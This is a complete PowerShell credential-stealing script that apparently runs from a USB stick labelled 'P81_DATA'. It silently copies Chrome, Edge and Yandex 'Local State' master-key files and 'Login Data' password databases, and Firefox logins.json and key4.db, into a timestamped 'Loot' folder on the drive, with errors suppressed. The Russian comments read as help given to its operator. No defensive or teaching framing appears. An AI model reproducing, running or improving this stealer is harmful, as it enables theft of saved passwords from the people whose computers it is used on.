$usb = Get-Volume | Where-Object { $_.FileSystemLabel -eq 'P81_DATA' } | Select-Object -ExpandProperty DriveLetter
if (!$usb) { exit }

$dest = "$($usb):\Loot\$(Get-Date -Format 'HH_mm_ss')"
New-Item -ItemType Directory -Path $dest -Force | Out-Null

$browsers = @(
    @{n="CHROME"; p="Google\Chrome\User Data"},
    @{n="EDGE"; p="Microsoft\Edge\User Data"},
    @{n="YANDEX"; p="Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    $uPath = Join-Path $env:LOCALAPPDATA $b.p
    if (Test-Path $uPath) {
        $prefix = $b.n # Фиксируем имя здесь
        
        # Копируем файл КЛЮЧЕЙ
        $ls = Join-Path $uPath "Local State"
        if (Test-Path $ls) { 
            Copy-Item $ls -Destination "$dest\$($prefix)_MASTER_KEY" -Force -ErrorAction SilentlyContinue 
        }
        
        # Копируем ПАРОЛИ
        Get-ChildItem -Path $uPath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
            $profile = $_.Directory.Name
            Copy-Item $_.FullName -Destination "$dest\$($prefix)_$($profile)_LOGINS.db" -Force -ErrorAction SilentlyContinue
        }
    }
}

# Блок Firefox оставляем как есть, он у тебя работал корректно
$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffPath) {
    Get-ChildItem -Path $ffPath -Directory | ForEach-Object {
        $p = $_.FullName
        Copy-Item (Join-Path $p "logins.json") -Destination "$dest\FF_$($_.Name)_logins.json" -ErrorAction SilentlyContinue
        Copy-Item (Join-Path $p "key4.db") -Destination "$dest\FF_$($_.Name)_key4.db" -ErrorAction SilentlyContinue
    }
}
exit
